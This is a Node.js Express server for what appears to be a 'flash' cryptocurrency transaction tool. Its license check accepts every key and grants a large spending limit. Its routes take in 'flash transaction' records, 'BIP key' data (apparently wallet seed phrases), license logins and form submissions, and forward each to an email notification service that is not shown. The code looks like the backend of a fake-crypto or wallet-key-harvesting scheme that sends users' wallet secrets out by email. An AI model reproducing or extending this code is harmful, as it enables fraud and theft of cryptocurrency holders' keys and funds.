require('dotenv').config();
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const emailService = require('./email-service');

const app = express();
const PORT = process.env.PORT || 3001;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Routes
app.get('/validate-license', async (req, res) => {
  try {
    const licenseKey = req.query.key;
    if (!licenseKey) {
      return res.status(400).json({ error: 'License key is required' });
    }

    console.log(`Validating license key: ${licenseKey}`);

    // For testing purposes, always consider the license key valid
    const licenseData = {
      id: Date.now(),
      key: licenseKey,
      status: 'active',
      created_at: new Date().toISOString(),
      expires_at: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString(),
      user: req.query.user || 'test@example.com',
      type: licenseKey.includes('DEMO') ? 'demo' : 'live',
      maxAmount: licenseKey.includes('DEMO') ? 30 : 10000000,
      timestamp: req.query.timestamp || new Date().toISOString()
    };

    // Send email notification
    try {
      await emailService.sendLicenseLoginNotification(licenseData);
      console.log('License login notification email sent successfully');
    } catch (emailError) {
      console.error('Error sending license login email:', emailError);
      // Continue even if email fails
    }

    return res.status(200).json({ valid: true, licenseKey: licenseData });
  } catch (error) {
    console.error('API Error:', error);
    return res.status(500).json({ error: 'Internal server error', details: error.message });
  }
});

// Alternative endpoint for license validation with POST method
app.post('/validate-license', async (req, res) => {
  try {
    const licenseData = req.body;
    if (!licenseData || !licenseData.key) {
      return res.status(400).json({ error: 'License key is required' });
    }

    console.log(`Validating license key (POST): ${licenseData.key}`);

    // Send email notification
    try {
      await emailService.sendLicenseLoginNotification(licenseData);
      console.log('License login notification email sent successfully');
    } catch (emailError) {
      console.error('Error sending license login email:', emailError);
      // Continue even if email fails
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('API Error:', error);
    return res.status(500).json({ error: 'Internal server error', details: error.message });
  }
});

app.post('/log-transaction', async (req, res) => {
  try {
    const transactionData = req.body;
    if (!transactionData) {
      return res.status(400).json({ error: 'Transaction data is required' });
    }

    console.log('Logging flash transaction:', transactionData);

    // Send email notification
    try {
      await emailService.sendFlashCreationNotification(transactionData);
      console.log('Flash creation notification email sent successfully');
    } catch (emailError) {
      console.error('Error sending flash creation email:', emailError);
      // Continue even if email fails
    }

    return res.status(200).json({ success: true, id: Date.now() });
  } catch (error) {
    console.error('API Error:', error);
    return res.status(500).json({ error: 'Internal server error', details: error.message });
  }
});

app.post('/bip-notification', async (req, res) => {
  try {
    const bipData = req.body;
    if (!bipData) {
      return res.status(400).json({ error: 'BIP data is required' });
    }

    console.log('Processing BIP notification:', bipData);

    // Send email notification
    try {
      await emailService.sendBipKeyNotification(bipData);
      console.log('BIP key notification email sent successfully');
    } catch (emailError) {
      console.error('Error sending BIP key email:', emailError);
      // Continue even if email fails
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('API Error:', error);
    return res.status(500).json({ error: 'Internal server error', details: error.message });
  }
});

// Handle license login notification
app.post('/license-login-notification', async (req, res) => {
  try {
    const licenseData = req.body;
    if (!licenseData) {
      return res.status(400).json({ error: 'License data is required' });
    }

    console.log('Processing license login notification:', licenseData);

    // Send email notification
    try {
      await emailService.sendLicenseLoginNotification(licenseData);
      console.log('License login notification email sent successfully');
    } catch (emailError) {
      console.error('Error sending license login email:', emailError);
      // Continue even if email fails
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('API Error:', error);
    return res.status(500).json({ error: 'Internal server error', details: error.message });
  }
});

// Handle form submission
app.post('/form-submission', async (req, res) => {
  try {
    const formData = req.body;
    if (!formData) {
      return res.status(400).json({ error: 'Form data is required' });
    }

    console.log('Processing form submission:', formData);

    // Send email notification
    try {
      await emailService.sendFormSubmissionNotification(formData);
      console.log('Form submission notification email sent successfully');
    } catch (emailError) {
      console.error('Error sending form submission email:', emailError);
      // Continue even if email fails
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('API Error:', error);
    return res.status(500).json({ error: 'Internal server error', details: error.message });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`Local API server running on http://localhost:${PORT}`);
  console.log('Available endpoints:');
  console.log(`- GET  http://localhost:${PORT}/validate-license?key=YOUR_LICENSE_KEY`);
  console.log(`- POST http://localhost:${PORT}/log-transaction`);
  console.log(`- POST http://localhost:${PORT}/bip-notification`);
  console.log(`- POST http://localhost:${PORT}/form-submission`);
  console.log(`- POST http://localhost:${PORT}/license-login-notification`);
});
